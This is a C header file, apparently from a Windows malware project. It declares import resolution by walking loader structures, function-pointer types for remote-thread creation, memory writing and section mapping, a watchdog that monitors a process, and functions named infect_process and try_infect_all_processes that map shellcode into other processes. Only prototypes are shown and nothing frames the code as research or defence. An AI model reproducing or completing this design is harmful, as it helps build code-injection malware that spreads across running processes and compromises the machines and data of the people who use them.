#pragma once
#include <Windows.h>
#include <winternl.h>

/* libc.c */
size_t
libc_wstrlen(const wchar_t* s);
int
libc_strcmp(const char* s1, const char* s2);
int
libc_wstrcmp(const wchar_t* s1, const wchar_t* s2);
int
libc_wstricmp(const wchar_t* s1, const wchar_t* s2);
wchar_t
libc_wtolower(const wchar_t c);
void
libc_memcpy(void* dst, const void* src, size_t n);
void
libc_memset(void* dst, const unsigned char c, size_t n);

/* dll.c */
typedef struct DLL_LDR_DATA_TABLE_ENTRY
{
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  WORD LoadCount;
  WORD TlsIndex;
  union
  {
    LIST_ENTRY HashLinks;
    struct
    {
      PVOID SectionPointer;
      ULONG CheckSum;
    };
  };
  union
  {
    ULONG TimeDateStamp;
    PVOID LoadedImports;
  };
  void* EntryPointActivationContext;
  PVOID PatchInformation;
  LIST_ENTRY ForwarderLinks;
  LIST_ENTRY ServiceTagLinks;
  LIST_ENTRY StaticLinks;
} DLL_LDR_DATA_TABLE_ENTRY, *DLL_PLDR_DATA_TABLE_ENTRY;

PVOID
get_module_base(PWSTR name);
PVOID
get_export_address(PBYTE module, PSTR name);

typedef enum _SECTION_INHERIT
{
  ViewShare = 1,
  ViewUnmap = 2
} SECTION_INHERIT;

typedef BOOL WINAPI
proto_CreateProcessW(LPCWSTR lpApplicationName,
                     LPWSTR lpCommandLine,
                     LPSECURITY_ATTRIBUTES lpProcessAttributes,
                     LPSECURITY_ATTRIBUTES lpThreadAttributes,
                     BOOL bInheritHandles,
                     DWORD dwCreationFlags,
                     LPVOID lpEnvironment,
                     LPCWSTR lpCurrentDirectory,
                     LPSTARTUPINFOW lpStartupInfo,
                     LPPROCESS_INFORMATION lpProcessInformation);
typedef LPVOID WINAPI
proto_VirtualAllocEx(HANDLE hProcess,
                     LPVOID lpAddress,
                     SIZE_T dwSize,
                     DWORD flAllocationType,
                     DWORD flProtect);
typedef BOOL WINAPI
proto_WriteProcessMemory(HANDLE hProcess,
                         LPVOID lpBaseAddress,
                         LPCVOID lpBuffer,
                         SIZE_T nSize,
                         SIZE_T* lpNumberOfBytesWritten);
typedef BOOL WINAPI
proto_CloseHandle(HANDLE hObject);
typedef NTSTATUS NTAPI
proto_NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
typedef VOID WINAPI
proto_Sleep(DWORD dwMilliseconds);
typedef NTSTATUS NTAPI
proto_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                               PVOID SystemInformation,
                               ULONG SystemInformationLength,
                               PULONG ReturnLength);
typedef BOOL WINAPI
proto_VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef LPVOID WINAPI
proto_VirtualAlloc(LPVOID lpAddress,
                   SIZE_T dwSize,
                   DWORD flAllocationType,
                   DWORD flProtect);
typedef NTSTATUS NTAPI
proto_NtMapViewOfSection(HANDLE SectionHandle,
                         HANDLE ProcessHandle,
                         PVOID* BaseAddress,
                         ULONG_PTR ZeroBits,
                         SIZE_T CommitSize,
                         PLARGE_INTEGER SectionOffset,
                         PSIZE_T ViewSize,
                         SECTION_INHERIT InheritDisposition,
                         ULONG AllocationType,
                         ULONG Win32Protect);
typedef BOOL WINAPI
proto_VirtualFreeEx(HANDLE hProcess,
                    LPVOID lpAddress,
                    SIZE_T dwSize,
                    DWORD dwFreeType);
typedef HANDLE WINAPI
proto_CreateRemoteThread(HANDLE hProcess,
                         LPSECURITY_ATTRIBUTES lpThreadAttributes,
                         SIZE_T dwStackSize,
                         LPTHREAD_START_ROUTINE lpStartAddress,
                         LPVOID lpParameter,
                         DWORD dwCreationFlags,
                         LPDWORD lpThreadId);
typedef HANDLE WINAPI
proto_OpenProcess(DWORD dwDesiredAccess,
                  BOOL bInheritHandle,
                  DWORD dwProcessId);
typedef NTSTATUS NTAPI
proto_NtCreateSection(PHANDLE SectionHandle,
                      ACCESS_MASK DesiredAccess,
                      POBJECT_ATTRIBUTES ObjectAttributes,
                      PLARGE_INTEGER MaximumSize,
                      ULONG SectionPageProtection,
                      ULONG AllocationAttributes,
                      HANDLE FileHandle);

struct dll_imports
{
  /* kernel32.dll */
  proto_CreateProcessW* CreateProcessW;
  proto_VirtualAllocEx* VirtualAllocEx;
  proto_WriteProcessMemory* WriteProcessMemory;
  proto_CloseHandle* CloseHandle;
  proto_Sleep* Sleep;
  proto_VirtualFree* VirtualFree;
  proto_VirtualAlloc* VirtualAlloc;
  proto_VirtualFreeEx* VirtualFreeEx;
  proto_CreateRemoteThread* CreateRemoteThread;
  proto_OpenProcess* OpenProcess;

  /* ntdll.dll */
  proto_NtCreateSection* NtCreateSection;
  proto_NtMapViewOfSection* NtMapViewOfSection;
  proto_NtQuerySystemInformation* NtQuerySystemInformation;
  proto_NtUnmapViewOfSection* NtUnmapViewOfSection;
};

int
resolve_dll_imports(struct dll_imports* imports);

/* watchdog.c */
struct watchdog_info
{
  LONG lock;
  ULONGLONG proc_id;
  WCHAR path[MAX_PATH + 1];
};

DWORD WINAPI
ThreadProc(_In_ LPVOID lpParameter);
int
monitor_proc_id(struct dll_imports* imports, struct watchdog_info* map);

/* process.c */
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

int
process_list(struct dll_imports* imports, PSYSTEM_PROCESS_INFORMATION* p_spi);
int
process_exists(struct dll_imports* imports, ULONGLONG proc_id);

/* infect.c */

int
infect_process(struct dll_imports* imports,
               HANDLE section,
               PVOID shell_base,
               SIZE_T shell_size,
               DWORD proc_id);
int
try_infect_all_processes(struct dll_imports* imports,
                         HANDLE section,
                         PVOID shell_base,
                         SIZE_T shell_size);
